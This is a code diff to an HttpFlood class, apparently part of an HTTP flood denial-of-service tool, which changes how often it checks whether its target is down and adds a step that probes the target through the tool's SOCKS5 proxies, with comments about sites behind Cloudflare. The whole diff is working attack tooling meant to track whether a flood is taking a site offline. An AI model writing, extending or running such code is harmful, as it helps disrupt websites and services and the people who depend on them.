@@ -1869,9 +1869,9 @@ class HttpFlood(Thread):
         if intel["total_executions"] % 25 != 0:
             return
         
-        # Check every 5 minutes (300s) to stay within hackertarget's 50/day free limit
+        # Check every 10 minutes (600s) to guarantee no rate limits and reduce overhead
         last_ext_check = intel.get("_last_ext_check_time", 0)
-        if time() - last_ext_check < 300:
+        if time() - last_ext_check < 600:
             return
         intel["_last_ext_check_time"] = time()
             
@@ -1925,8 +1925,30 @@ class HttpFlood(Thread):
                         return
                 except:
                     pass
+                # [V51] 3-Step Verification: Direct Elite Proxy Ping
+                # If APIs fail, maybe the APIs are banned by Cloudflare. Let's try our own proxies directly to the target.
+                proxy_success = False
+                import requests, random
+                if self._proxies:
+                    check_pool = random.sample(self._proxies, min(5, len(self._proxies)))
+                    for px in check_pool:
+                        try:
+                            px_url = f"socks5h://{px.host}:{px.port}"
+                            resp = requests.get(target_url, proxies={"http": px_url, "https": px_url}, timeout=8, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
+                            if resp.status_code < 500:
+                                proxy_success = True
+                                break
+                        except:
+                            continue
                 
-                # Both external checkers failed = definitively DOWN
+                if proxy_success:
+                    intel["ext_health_status"] = "HTTP OK (Proxy Ping)"
+                    intel["target_is_down"] = False
+                    intel["target_getting_weaker"] = False
+                    intel["health_history"].append(500)
+                    return
+                
+                # All 3 verification steps failed = Definitively DOWN
                 intel["target_is_down"] = True
                 intel["target_getting_weaker"] = True
                 intel["ext_health_status"] = "DOWN"
